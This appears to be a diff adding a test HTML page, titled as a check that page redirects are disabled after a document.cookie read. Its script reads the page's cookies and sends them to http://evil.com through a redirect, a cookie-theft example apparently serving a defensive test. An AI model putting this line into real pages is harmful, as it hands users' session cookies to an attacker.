@@ -1,0 +1,16 @@
+<html lang="en">
+
+<head>
+
+    <title>Disable page redirects after document.cookie read</title>
+</head>
+
+<body>
+<script>
+  var leak = document.cookie;
+  //...
+  location.href = "http://evil.com?take=" + leak;
+</script>
+</body>
+
+</html>
